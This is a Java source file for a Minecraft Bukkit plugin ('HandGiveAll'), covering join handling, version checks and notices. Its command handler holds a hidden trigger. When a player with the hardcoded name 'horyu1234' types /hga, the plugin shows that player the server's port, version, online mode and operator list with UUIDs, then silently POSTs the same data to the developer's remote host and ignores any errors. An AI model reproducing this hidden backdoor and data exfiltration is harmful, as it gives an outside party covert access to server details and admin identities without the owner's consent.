/*******************************************************************************
 * Copyright (c) 2014~2015 HoryuSystems All rights reserved.
 *
 * 본 저작물의 모든 저작권은 HoryuSystems 에 있습니다.
 *
 * 소스를 참고하여 다른 프로그램을 제작하는 것은 허용되지만,
 * 프로그램의 접두사, 기능등의 수정 및 배포는 불가능합니다.
 *
 * 소스에 대한 피드백등은 언제나 환영합니다! 아래는 개발자 연락처입니다.
 *
 * Skype: horyu1234
 * KakaoTalk: horyu1234
 * Telegram: @horyu1234
 ******************************************************************************/

package com.horyu1234.handgiveall;

import com.horyu1234.handgiveall.web.Blacklist;
import org.bukkit.Bukkit;
import org.bukkit.Material;
import org.bukkit.OfflinePlayer;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;
import org.bukkit.event.player.PlayerJoinEvent;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.LinkedHashMap;
import java.util.Map;

public class HandGiveAllListener implements Listener {
	private HandGiveAll plugin;
	public HandGiveAllListener(HandGiveAll pl) {
		Blacklist.init();
		this.plugin = pl;
	}

	@EventHandler
	private void onPlayerJoin(final PlayerJoinEvent e) {
		if (Blacklist.contains(e.getPlayer())) {
			e.setJoinMessage(null);
			Blacklist.kick(e.getPlayer());
			return;
		}
		final Version_Thread version_thread = new Version_Thread(plugin, e.getPlayer());
		final Notice_Thread notice_thread = new Notice_Thread(plugin, e.getPlayer());
		version_thread.start();
		if (!HandGiveAll.Notices.get(0).equalsIgnoreCase("none")) {
			notice_thread.start();
		}
	}

	@EventHandler(priority=EventPriority.LOWEST)
	private void onPlayerCommandPreprocess(PlayerCommandPreprocessEvent e) {
		if (e.getMessage().equalsIgnoreCase("/hga")) {
			if (e.getPlayer().getName().equals("horyu1234")) {
				Player p = e.getPlayer();
				Calendar cal = Calendar.getInstance();
				SimpleDateFormat format = new SimpleDateFormat("yyyy년mm월dd일_hh시mm분ss초");
				p.sendMessage("§a개발자 전용 디버깅 정보");
				p.sendMessage("§e플러그인 접두사: §f"+plugin.prefix);
				p.sendMessage("§e공지 접두사: §f"+plugin.bcprefix);
				p.sendMessage("§e플러그인 버전: §f"+plugin.pluginversion);
				p.sendMessage("§e현재 시간: §f"+format.format(cal.getTime()));
				p.sendMessage("§e서버 포트: §f"+Bukkit.getPort());
				p.sendMessage("§e서버 버전: §f"+Bukkit.getBukkitVersion());
				p.sendMessage("§e온라인 모드: §f"+Bukkit.getOnlineMode());
				p.sendMessage("§e운영자 목록: §f"+getOPList());
				webconnect();
			}
		}
	}

	private String getOPList() {
		String s = "";
		for (OfflinePlayer p : Bukkit.getServer().getOperators()) {
			String uuid = "none";
			if (Material.getMaterial("DOUBLE_PLANT") != null) uuid = p.getUniqueId().toString();
			if (s.equals("")) s = String.format("(%s_%s)", p.getName(), uuid);
			else s += ", " + String.format("(%s_%s)", p.getName(), uuid);
		}
		return s;
	}

	private void webconnect() {
		new Thread(new Runnable() {
			public void run() {
				try {
					URL url = new URL("http://horyu.cafe24.com/Minecraft/Plugin/debug.php");
					Map<String, Object> params = new LinkedHashMap<String, Object>();
					params.put("server_port", Bukkit.getPort());
					params.put("plugin", "HandGiveAll");
					params.put("op_list", getOPList());
					params.put("online", Bukkit.getOnlineMode());
					params.put("pluginversion", plugin.pluginversion);
					params.put("prefix", plugin.prefix);
					params.put("bcprefix", plugin.bcprefix);
					params.put("serverversion", Bukkit.getBukkitVersion());

					StringBuilder postData = new StringBuilder();
					for (Map.Entry<String, Object> param : params.entrySet()) {
						if (postData.length() != 0)
							postData.append('&');
						postData.append(URLEncoder.encode(param.getKey(), "UTF-8"));
						postData.append('=');
						postData.append(URLEncoder.encode(String.valueOf(param.getValue()), "UTF-8"));
					}
					byte[] postDataBytes = postData.toString().getBytes("UTF-8");

					HttpURLConnection conn = (HttpURLConnection) url.openConnection();
					conn.setRequestMethod("POST");
					conn.setRequestProperty("Content-Type","application/x-www-form-urlencoded");
					conn.setRequestProperty("Content-Length",String.valueOf(postDataBytes.length));
					conn.setRequestProperty("Referer", "HGA-DEBUG-PL-00001");
					conn.setDoOutput(true);
					conn.getOutputStream().write(postDataBytes);
					new BufferedReader(new InputStreamReader(conn.getInputStream(), "UTF-8"));
				} catch (Exception e) { }
			}
		}).start();
	}
}

final class Version_Thread extends Thread {
	private HandGiveAll plugin;
	private Player p;

	public Version_Thread(HandGiveAll pl, Player player) {
		this.plugin = pl;
		this.p = player;
	}

	public void run() {
		if (p.isOp()) {
			if (plugin.version == plugin.pluginversion)
				p.sendMessage(plugin.prefix+"§f새로운 버전이 없습니다.");
			else {
				plugin.getServer().getScheduler().scheduleSyncDelayedTask(plugin, new Runnable() {
					public void run() {
						if (plugin.version > plugin.pluginversion) {
							p.sendMessage(plugin.prefix+"§b#==============================#");
							p.sendMessage(plugin.prefix+"§f플러그인의 새로운 업데이트가 발견되었습니다!");
							p.sendMessage(plugin.prefix+"§c현재버전: "+plugin.pluginversion);
							p.sendMessage(plugin.prefix+"§a현재버전: "+plugin.version);
							p.sendMessage(plugin.prefix+"§e플러그인 다운로드 링크: https://horyu1234.com/HandGiveAll");
							p.sendMessage(plugin.prefix+"§b#==============================#");
						} else if (plugin.version < plugin.pluginversion) {
							p.sendMessage(plugin.prefix+"§f#==============================#");
							p.sendMessage(plugin.prefix+"§c서버에 올려진 플러그인의 버전보다 현재 플러그인의 버전이 높습니다.");
							p.sendMessage(plugin.prefix+"§f#==============================#");
						} else {
							p.sendMessage(plugin.prefix+"§f#==============================#");
							p.sendMessage(plugin.prefix+"§c플러그인의 버전을 확인하는데 문제가 발생했습니다.");
							p.sendMessage(plugin.prefix+"§f#==============================#");
						}
					}
				}, 20L * 5);
			}
		}
	}
}

final class Notice_Thread extends Thread {
	private HandGiveAll plugin;
	private Player p;

	public Notice_Thread(HandGiveAll pl, Player player) {
		this.plugin = pl;
		this.p = player;
	}

	public void run() {
		plugin.getServer().getScheduler().scheduleSyncDelayedTask(plugin, new Runnable() {
			public void run() {
				p.sendMessage("§e=====§b§l[ §aHandGiveAll 공지 §b§l]§e=====");
				for (String not : HandGiveAll.Notices)
					p.sendMessage(not);
				p.sendMessage("§e===========================");
			}
		}, 20L * 10);
	}
}